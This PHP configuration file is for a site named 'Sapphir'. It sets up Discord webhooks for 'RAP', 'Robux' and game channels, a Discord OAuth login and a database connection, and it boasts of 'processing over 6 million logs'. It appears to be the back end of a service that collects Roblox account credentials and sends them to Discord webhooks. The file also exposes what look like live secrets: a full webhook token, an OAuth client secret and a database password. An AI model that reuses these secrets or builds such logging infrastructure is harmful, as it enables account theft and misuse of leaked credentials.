<?php
$site = 
[
    "Info" =>
    [
        "Name" => "Sapphir",
        "Thumbnail" => "/assets/img/logo.png",
        "Color" => "FFFFFF"
    ],
    "Discord" => 
    [
        "Webhooks" => 
        [
            "Normal" => "https://discord.com/api/webhooks/1503141603424862310/wH9hcXcRvFpSF0FIvSAqfrH-7n30c2c7jhgFZaVtJP7eXvSos1Amm0XNHcHgep54n4pS",
            "RAP" => "",
            "Robux" => "",
            "Summary" => "",
            "Games" =>
            [
                0 => "", // put game id instead of 0
                0 => "", // put game id instead of 0
                0 => "", // put game id instead of 0
                0 => ""  // put game id instead of 0
            ]
        ],
        "Oauth" => 
        [
            "Client_Id" => "1505704779257745408",
            "Redirect_Uri" => "https://" . $_SERVER["SERVER_NAME"] . "/discord",
            "Scope" => "identify guilds guilds.join",
            "Client_Secret" => "YDDRKHwNktom9xWV8hRZCrH41u5KP45e",
        ],
        "Invite" => "https://discord.gg/KQCCEE2JMv"
    ],
    "DB" => 
    [
    "Host" => "localhost:3306",
    "Name" => "admin_oxy",
    "User" => "kingoxy",
    "Pass" => "xzb45@N00",
    ]
];

$Query = 
[
    "response_type" => "code",
    "client_id"     => $site["Discord"]["Oauth"]["Client_Id"],
    "redirect_uri"  => $site["Discord"]["Oauth"]["Redirect_Uri"],
    "scope"         => $site["Discord"]["Oauth"]["Scope"]
];
$site["Discord"]["Oauth"]["URL"] = 
    "https://discord.com/oauth2/authorize?" . http_build_query($Query);
    
$site["Info"]["Description"] = "Since 2021, " . $site["Info"]["Name"] . " has been delivering top-tier services, processing over 6 million logs.";
?>